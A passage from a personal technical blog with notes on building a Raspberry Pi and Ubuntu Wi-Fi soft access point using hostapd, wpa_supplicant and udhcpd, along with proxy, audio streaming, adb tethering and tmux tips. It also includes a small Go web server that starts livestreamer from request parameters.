target="_blank" rel="noopener" href="http://raspberrypi.stackexchange.com/questions/37920/how-do-i-set-up-networking-wifi-static-ip-address">http://raspberrypi.stackexchange.com/questions/37920/how-do-i-set-up-networking-wifi-static-ip-address</a> and <a target="_blank" rel="noopener" href="https://www.raspberrypi.org/documentation/hardware/raspberrypi/bootmodes/net_tutorial.md">https://www.raspberrypi.org/documentation/hardware/raspberrypi/bootmodes/net_tutorial.md</a></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl disable dhcpcd</span><br><span class="line">sudo systemctl enable networking</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line"></span><br><span class="line">iface lo inet loopback</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"></span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">iface wlan0 inet static</span><br><span class="line">  address 192.168.42.100</span><br><span class="line">  netmask 255.255.255.0</span><br><span class="line"></span><br><span class="line">#allow-hotplug wlan0</span><br><span class="line">#iface wlan0 inet manual</span><br><span class="line">#wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf</span><br><span class="line">#iface default inet dhcp</span><br></pre></td></tr></table></figure>

<h1 id="Settings-in-x2F-boot-x2F-hostadp-8188eu-conf"><a href="#Settings-in-x2F-boot-x2F-hostadp-8188eu-conf" class="headerlink" title="Settings in &#x2F;boot&#x2F;hostadp.8188eu.conf"></a>Settings in &#x2F;boot&#x2F;hostadp.8188eu.conf</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan0</span><br><span class="line">driver=rtl871xdrv</span><br><span class="line">ssid=RasPi-AP</span><br><span class="line">hw_mode=g</span><br><span class="line">channel=1</span><br><span class="line">macaddr_acl=0</span><br><span class="line">auth_algs=1</span><br><span class="line">ignore_broadcast_ssid=0</span><br><span class="line">wpa=1</span><br><span class="line">wpa_pairwise=CCMP</span><br><span class="line">#wpa=2</span><br><span class="line">#rsn_pairwise=TKIP CCMP</span><br><span class="line">wpa_passphrase=123456789</span><br><span class="line">wpa_key_mgmt=WPA-PSK</span><br></pre></td></tr></table></figure>


<h1 id="Settings-in-x2F-lib-x2F-systemd-x2F-system-x2F-hostapd-service-as-below"><a href="#Settings-in-x2F-lib-x2F-systemd-x2F-system-x2F-hostapd-service-as-below" class="headerlink" title="Settings in &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;hostapd.service as below"></a>Settings in &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;hostapd.service as below</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=My Hostapd Service</span><br><span class="line">After=multi-user.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=idle</span><br><span class="line">ExecStart=/boot/my-hostapd.sh</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 644 /lib/systemd/system/hostapd.service</span><br><span class="line">sudo systemctl daemon-reload  # 重载所有修改过的配置文件</span><br><span class="line">sudo systemctl enable hostapd.service</span><br></pre></td></tr></table></figure>

<h1 id="Check-the-hostapd-service"><a href="#Check-the-hostapd-service" class="headerlink" title="Check the hostapd.service"></a>Check the hostapd.service</h1><p><code>sudo systemctl status hostapd.service</code></p>
<h1 id="Start-x2F-Stop-x2F-Restart-the-hostapd-service"><a href="#Start-x2F-Stop-x2F-Restart-the-hostapd-service" class="headerlink" title="Start&#x2F;Stop&#x2F;Restart the hostapd.service"></a>Start&#x2F;Stop&#x2F;Restart the hostapd.service</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start hostapd.service</span><br><span class="line">sudo systemctl stop hostapd.service</span><br><span class="line">sudo systemctl restart hostapd.service</span><br></pre></td></tr></table></figure>

<h1 id="Run-tmux-in-Ubuntu"><a href="#Run-tmux-in-Ubuntu" class="headerlink" title="Run tmux in Ubuntu"></a>Run tmux in Ubuntu</h1><p>options in &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ctrl_interface=/var/run/wpa_supplicant</span><br><span class="line">update_config=1</span><br><span class="line"></span><br><span class="line">network=&#123;</span><br><span class="line">    ssid=&quot;RasPi-AP&quot;</span><br><span class="line">    psk=&quot;iplababab1411&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h1><ol>
<li>In one pane, run <code>sudo wpa_supplicant -Dnl80211,wext -iwlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf</code><br>The option of ‘wext’ is the 8188eu driver for wpa_supplicant</li>
<li>In other pane, run <code>sudo wpa_cli</code> or <code>sudo iwlist wlan0 scan</code></li>
<li>iw command for “nl80211”, iwconfig&#x2F;iwlist(wireless_tools) for “wext” (rtl871xdrv)</li>
<li>wpa_supplicant - works with both wext and nl80211.<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iwconfig wlan0 =&gt; iw dev wlan0 link (Getting info on wlan0)</span><br><span class="line">iwconfig wlan0 essid foo =&gt; iw wlan0 connect foo (Connecting to an open network)</span><br><span class="line">iwconfig wlan0 essid off =&gt; iw wlan0 ibss leave (Leave an IBSS (ad-hoc network))</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="Install-udhcpd"><a href="#Install-udhcpd" class="headerlink" title="Install udhcpd"></a>Install udhcpd</h1><ol>
<li><p><code>sudo apt-get install udhcpd</code></p>
</li>
<li><p>Settings in &#x2F;etc&#x2F;udhcpd.conf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">start 192.168.42.2 # This is the range of IPs that the hostspot will give to client devices.</span><br><span class="line">end 192.168.42.20</span><br><span class="line">interface wlan0 # The device uDHCP listens on.</span><br><span class="line">max_leases 10</span><br><span class="line">remaining yes</span><br><span class="line">opt dns 8.8.8.8 4.2.2.2 # The DNS servers client devices will use.</span><br><span class="line">opt subnet 255.255.255.0</span><br><span class="line">opt router 192.168.42.100 # The Pi&#x27;s IP address on wlan0 which we will set up shortly.</span><br><span class="line">opt lease 864000 # 10 day DHCP lease time in seconds</span><br></pre></td></tr></table></figure></li>
<li><p>Enable dhcpd <code>#DHCPD_ENABLED=&quot;no&quot;</code> in &#x2F;etc&#x2F;default&#x2F;udhcpd </p>
</li>
<li><p>Start service</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart hostapd.service</span><br><span class="line">sudo service udhcpd restart</span><br></pre></td></tr></table></figure>
</li>
<li><p>Check result<br>  <code>service udhcpd status</code> Or<br>  <code>cat /var/log/syslog | grep udhcpd</code></p>
</li>
<li><p>Get the udhcpd to start on boot<br>  <code>sudo update-rc.d udhcpd enable</code></p>
</li>
</ol>
<p>Reference<br><a target="_blank" rel="noopener" href="http://www.raspberrypi-spy.co.uk/2015/10/how-to-autorun-a-python-script-on-boot-using-systemd/">http://www.raspberrypi-spy.co.uk/2015/10/how-to-autorun-a-python-script-on-boot-using-systemd/</a><br><a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/WPA_supplicant">https://wiki.archlinux.org/index.php/WPA_supplicant</a><br><a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/Wireless_network_configuration">https://wiki.archlinux.org/index.php/Wireless_network_configuration</a><br><a target="_blank" rel="noopener" href="http://elinux.org/RPI-Wireless-Hotspot">http://elinux.org/RPI-Wireless-Hotspot</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Create-AP-with-Hostapd-on-Ubuntu-Rpi" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2017-01-11T09:22:55.000Z"><a href="/2017/01/11/Create-AP-with-Hostapd-on-Ubuntu-Rpi/">2017-01-11</a></time>
      
      
  
    <h1 class="title"><a href="/2017/01/11/Create-AP-with-Hostapd-on-Ubuntu-Rpi/">Create SoftAP with Hostapd on Ubuntu and Rpi.md</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="In-Ubuntu-14-04"><a href="#In-Ubuntu-14-04" class="headerlink" title="In Ubuntu 14.04"></a>In Ubuntu 14.04</h1><h2 id="Check-whether-the-module-8188eu-is-load-lsmod-grep-8188-or-lsusb"><a href="#Check-whether-the-module-8188eu-is-load-lsmod-grep-8188-or-lsusb" class="headerlink" title="Check whether the module 8188eu is load lsmod|grep 8188 or lsusb"></a>Check whether the module 8188eu is load <code>lsmod|grep 8188</code> or <code>lsusb</code></h2><h2 id="Download-and-compile-latest-hostapd-with-RTL8188-drivers"><a href="#Download-and-compile-latest-hostapd-with-RTL8188-drivers" class="headerlink" title="Download and compile latest hostapd with RTL8188 drivers"></a>Download and compile latest hostapd with RTL8188 drivers</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lostincynicism/hostapd-rtl8188</span><br><span class="line">sudo apt-get install libnl-3-dev # Fix fatal-error-netlink-genl-genl-h-no-such-file-or-directory</span><br><span class="line">sudo apt-get install libnl-genl-3-dev</span><br><span class="line">cd hostapd-rtl8188/hostapd &amp;&amp; sudo make all</span><br></pre></td></tr></table></figure>

<h2 id="The-complete-options-in-x2F-usr-x2F-share-x2F-doc-x2F-hostapd-x2F-examples-x2F-hostadp-8188eu-conf"><a href="#The-complete-options-in-x2F-usr-x2F-share-x2F-doc-x2F-hostapd-x2F-examples-x2F-hostadp-8188eu-conf" class="headerlink" title="The complete options in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;hostapd&#x2F;examples&#x2F;hostadp.8188eu.conf"></a>The complete options in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;hostapd&#x2F;examples&#x2F;hostadp.8188eu.conf</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan0</span><br><span class="line">driver=rtl871xdrv</span><br><span class="line">ssid=Soft-AP</span><br><span class="line">hw_mode=g</span><br><span class="line">channel=6</span><br><span class="line">macaddr_acl=0</span><br><span class="line">auth_algs=1</span><br><span class="line">ignore_broadcast_ssid=0</span><br><span class="line">#wpa=1</span><br><span class="line">#wpa_pairwise=CCMP</span><br><span class="line">wpa=2</span><br><span class="line">rsn_pairwise=TKIP CCMP</span><br><span class="line">wpa_passphrase=123456789</span><br><span class="line">wpa_key_mgmt=WPA-PSK</span><br></pre></td></tr></table></figure>

<h2 id="Fix-“Cannot-find-the-ssid-problem”"><a href="#Fix-“Cannot-find-the-ssid-problem”" class="headerlink" title="Fix “Cannot find the ssid problem”"></a>Fix “Cannot find the ssid problem”</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmcli nm wifi off</span><br><span class="line">sudo rfkill unblock wlan # disable power saving mode, use **sudo nmcli radio wifi off** if Error: Object &#x27;nm&#x27; is unknown then use this instead:</span><br></pre></td></tr></table></figure>
<p>Following maybe not work but for reference </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl disable NetworkManager.service </span><br><span class="line">sudo systemctl enable networking.service</span><br><span class="line"></span><br><span class="line">sudo systemctl status wpa_supplicant.service</span><br><span class="line"></span><br><span class="line">sudo systemctl --force stop wpa_supplicant.service</span><br><span class="line">wpa_cli -i wlan0 terminate # stop wpa_supplicant program as it is conflicted with hostapd</span><br></pre></td></tr></table></figure>

<h2 id="Start-hostapd"><a href="#Start-hostapd" class="headerlink" title="Start hostapd"></a>Start hostapd</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd hostapd-rtl8188/hostapd</span><br><span class="line">sudo ./hostapd -dd /usr/share/doc/hostapd/examples/hostadp.8188eu.conf</span><br><span class="line">sudo ifconfig wlan0 192.168.42.1</span><br></pre></td></tr></table></figure>

<h1 id="In-Raspberry-Pi"><a href="#In-Raspberry-Pi" class="headerlink" title="In Raspberry Pi"></a>In Raspberry Pi</h1><h2 id="Configure-IP-sudo-ifconfig-wlan0-192-168-42-100"><a href="#Configure-IP-sudo-ifconfig-wlan0-192-168-42-100" class="headerlink" title="Configure IP sudo ifconfig wlan0 192.168.42.100"></a>Configure IP <code>sudo ifconfig wlan0 192.168.42.100</code></h2><h2 id="Scan-ssid-iwlist-wlan0-scan"><a href="#Scan-ssid-iwlist-wlan0-scan" class="headerlink" title="Scan ssid iwlist wlan0 scan"></a>Scan ssid <code>iwlist wlan0 scan</code></h2><h2 id="Connect-to-ssid-“Soft-AP”"><a href="#Connect-to-ssid-“Soft-AP”" class="headerlink" title="Connect to ssid “Soft-AP”"></a>Connect to ssid “Soft-AP”</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># wpa_cli</span><br><span class="line">&gt;scan</span><br><span class="line">&gt;scan_results</span><br><span class="line">&gt;add_network</span><br><span class="line">&gt;set_network 0 ssid &quot;Soft-AP&quot;</span><br><span class="line">&gt;set_network 0 psk &quot;123456789&quot;</span><br><span class="line">&gt;enable_network 0</span><br><span class="line">&gt;quit</span><br><span class="line"># ping 192.168.42.1 or iwconfig</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wpa_cli -i wlan0 terminate (關閉wpa_supplicant)</span><br><span class="line">wpa_cli -i wlan0 save_config (儲存寫入到wpa_supplicant.conf中，否責變更無效) need &quot;update_config=1&quot; in /etc/wpa_supplicant/wpa_supplicant.conf</span><br><span class="line">wpa_cli -i wlan0 select_network (選擇不同的AP，id為AP代號0,1,2,3...)</span><br><span class="line">wpa_cli -i wlan0 disable_network</span><br><span class="line">wpa_cli -i wlan0 remove_network (刪除AP資訊)</span><br><span class="line">wpa_cli -i wlan0 disconnect (斷線)</span><br><span class="line">wpa_cli -i wlan0 reconnect (重新連線)</span><br><span class="line">wpa_cli -i wlan0 list_networks (查看wpa_supplicant.conf檔裡的設定)</span><br><span class="line">wpa_cli -i wlan0 interface (查看有那些無線網卡介面)</span><br></pre></td></tr></table></figure>

<h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="In-Ubuntu"><a href="#In-Ubuntu" class="headerlink" title="In Ubuntu"></a>In Ubuntu</h2><ul>
<li>Set proxy <code>java -cp lib/log4j-1.2.16.jar:lib/jboss-common-logging-spi.jar:lib/netty.jar org.jboss.netty.example.proxy.HexDumpProxy 8081 10.13.135.115 8080</code></li>
</ul>
<h2 id="In-RaspPi"><a href="#In-RaspPi" class="headerlink" title="In RaspPi"></a>In RaspPi</h2><ul>
<li>Setting Up apt-get with proxy. Add file proxy.conf in “&#x2F;etc&#x2F;apt&#x2F;“ with content <code>Acquire::http::Proxy &quot;http://192.168.42.1:8081/&quot;;</code></li>
<li>Setting Up http proxy by <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=http://192.168.42.1:8081/</span><br><span class="line">export https_proxy=http://192.168.42.1:8081/</span><br></pre></td></tr></table></figure></li>
<li>Run <code>sudo apt-get install apt-transport-https</code> if problem “E: The method driver &#x2F;usr&#x2F;lib&#x2F;apt&#x2F;methods&#x2F;https could not be found.” occurs when <code>sudo apt-get update</code></li>
<li>Install mpv from <a target="_blank" rel="noopener" href="https://nwgat.ninja/quick-easy-compiling-mpv-for-raspberry-pi/">https://nwgat.ninja/quick-easy-compiling-mpv-for-raspberry-pi/</a> </li>
<li>Install livestreamer</li>
</ul>
<ol>
<li>Download setuptools from <a target="_blank" rel="noopener" href="https://pypi.python.org/pypi/setuptools#downloads">https://pypi.python.org/pypi/setuptools#downloads</a></li>
<li>Install setuptools <code>python setup.py install</code> and <code>sudo -E easy_install livestreamer</code></li>
<li>Test the audio <code>livestreamer --https-proxy=http://192.168.42.1:8081 --http-proxy=http://192.168.42.1:8081 hlsvariant://http://rthkaudio1-lh.akamaihd.net/i/radio1_1@355864/master.m3u8 best -p mpv</code></li>
<li>Change the volumn by<br>  4.1 <code>amixer controls</code> to show the Master Playback Volume<br>  4.2 Get details of the master playback volume control by <code>amixer cget numid=3</code>, it shows a pair of volume values&#x3D;65536,65536(for left and right channels)<br>  <code>alsamixer</code>, save volumn level via <code>sudo alsactl store</code><br>  <code>amixer cset numid=1 -- 80%</code> or <code>amixer cset numid=3 80%</code> Or <code>amixer set Master 100%</code><br>  4.3 To mute the sound by <code>amixer cset numid=4 off</code> (Control 4), this also affects the volume values on control 3<br>  Reference <a target="_blank" rel="noopener" href="http://blog.scphillips.com/posts/2013/01/sound-configuration-on-raspberry-pi-with-alsa/">http://blog.scphillips.com/posts/2013/01/sound-configuration-on-raspberry-pi-with-alsa/</a></li>
<li>Set audio output device <code>amixer cset numid=3 N</code> (N&#x3D;0&#x3D;auto, 1&#x3D;analog, 2&#x3D;hdmi)</li>
</ol>
<ul>
<li>Start openssh-server <code>sudo service ssh start</code></li>
<li>Install openvpn <code>sudo apt-get install openvpn</code></li>
<li>Install adb and fastboot by <code>sudo apt-get install android-tools-adb android-tools-fastboot</code></li>
<li>Configure udev service for detecting the pluged phone <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo wget -O /etc/udev/rules.d/51-android.rules https://raw.githubusercontent.com/NicolasBernaerts/ubuntu-scripts/master/android/51-android.rules</span><br><span class="line">sudo chmod a+r /etc/udev/rules.d/51-android.rules</span><br><span class="line">sudo service udev restart</span><br></pre></td></tr></table></figure></li>
<li>Plug the mobile and mount the sdcard by <code>sudo mount /dev/sda1 /mnt</code><br>Check the disk by<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo fdisk -l /dev/sda</span><br><span class="line">sudo lsblk</span><br><span class="line">df -h</span><br></pre></td></tr></table></figure></li>
<li>USB tethering<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:41927 tcp:41927</span><br><span class="line">sudo openvpn azilink.ovpn</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="6">
<li>Write PiCast application with golang<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;github.com/gorilla/mux&quot;</span><br><span class="line">	&quot;io/ioutil&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">	&quot;os/exec&quot;</span><br><span class="line">	&quot;strings&quot;</span><br><span class="line">	&quot;syscall&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	r := mux.NewRouter()</span><br><span class="line">	r.HandleFunc(&quot;/&quot;, Home)</span><br><span class="line">	//r.HandleFunc(&quot;/yt-stream/&#123;args&#125;&quot;, Youtube)</span><br><span class="line">	r.HandleFunc(&quot;/yt-stream&quot;, Youtube)</span><br><span class="line"></span><br><span class="line">	bind := fmt.Sprintf(&quot;%s:%s&quot;, os.Getenv(&quot;HOST&quot;), os.Getenv(&quot;PORT&quot;))</span><br><span class="line">	fmt.Printf(&quot;listening on %s...\n&quot;, bind)</span><br><span class="line">	err := http.ListenAndServe(bind, r)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func Home(res http.ResponseWriter, req *http.Request) &#123;</span><br><span class="line">	fmt.Fprint(res, &quot;Welcome to PiCAST! In the URL, type what you want to do...\n&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func Youtube(res http.ResponseWriter, req *http.Request) &#123;</span><br><span class="line">	body := readReqBody(req)</span><br><span class="line">	url := body[&quot;url&quot;]</span><br><span class="line"></span><br><span class="line">	if url == &quot;&quot; &#123;</span><br><span class="line">		args := body[&quot;args&quot;]</span><br><span class="line">		url = &quot;https://www.youtube.com/watch?v=&quot; + args</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	p := body[&quot;proxy&quot;]</span><br><span class="line"></span><br><span class="line">	http_proxy := &quot;&quot;</span><br><span class="line">	https_proxy := &quot;&quot;</span><br><span class="line"></span><br><span class="line">	if p != &quot;&quot; &#123;</span><br><span class="line">		http_proxy = &quot;--https-proxy=&quot; + p</span><br><span class="line">		https_proxy = &quot;--http-proxy=&quot; + p</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	args := []string&#123;http_proxy, https_proxy, url, &quot;best&quot;, &quot;--player=mpv&quot;&#125;</span><br><span class="line">	fmt.Println(args)</span><br><span class="line"></span><br><span class="line">	run(args)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func run(args []string) &#123;</span><br><span class="line">    exec.Command(&quot;killall livestreamer&quot;).Run()</span><br><span class="line"></span><br><span class="line">	binary, lookErr := exec.LookPath(&quot;livestreamer&quot;)</span><br><span class="line">	if lookErr != nil &#123;</span><br><span class="line">		panic(lookErr)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	env := os.Environ()</span><br><span class="line"></span><br><span class="line">	execErr := syscall.Exec(binary, args, env)</span><br><span class="line">	if execErr != nil &#123;</span><br><span class="line">		fmt.Println(&quot;execErr&quot;, execErr)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func runOld(args []string) &#123;</span><br><span class="line">	cmd := exec.Command(&quot;livestreamer&quot;, args...)</span><br><span class="line">	fmt.Println(cmd.Path)</span><br><span class="line">	fmt.Println(cmd.Args)</span><br><span class="line">	fmt.Println(cmd.Env)</span><br><span class="line"></span><br><span class="line">	if err := cmd.Start(); err != nil &#123;</span><br><span class="line">		fmt.Printf(&quot;cmd.Start: %v\n&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if err := cmd.Wait(); err != nil &#123;</span><br><span class="line">		if exiterr, ok := err.(*exec.ExitError); ok &#123;</span><br><span class="line">			if status, ok := exiterr.Sys().(syscall.WaitStatus); ok &#123;</span><br><span class="line">				fmt.Printf(&quot;Exit Status: %d\n&quot;, status.ExitStatus())</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			fmt.Printf(&quot;cmd.Wait: %v\n&quot;, err)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func readReqBody(req *http.Request) map[string]string &#123;</span><br><span class="line">	body, _ := ioutil.ReadAll(req.Body)</span><br><span class="line">	// Info.Println(&quot;body = &quot;, string(body))</span><br><span class="line">	m := make(map[string]string)</span><br><span class="line"></span><br><span class="line">	content := strings.Split(string(body), &quot;&amp;&quot;)</span><br><span class="line">	for _, c := range content &#123;</span><br><span class="line">		p := strings.Split(c, &quot;=&quot;)</span><br><span class="line">		if len(p) == 2 &#123;</span><br><span class="line">			m[p[0]] = p[1]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return m</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>Cross compile this web application in linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">env GOOS=linux GOARCH=arm go build -ldflags=&quot;-s -w&quot; main.go</span><br><span class="line">scp -i id_rsa main pi@192.168.42.100:/home/pi/</span><br></pre></td></tr></table></figure>
</li>
<li><p>Install tmux on ubuntu<br><code>sudo apt-get install tmux</code></p>
<pre>
ctrl+b % - split window vertically
ctrl+b " - split window horizontally
ctrl+b o - Goto next pane
ctrl+b c - Create new window
ctrl+b w - List all windows 
ctrl+b l - Move to the previously selected window
</pre></li>
</ul>
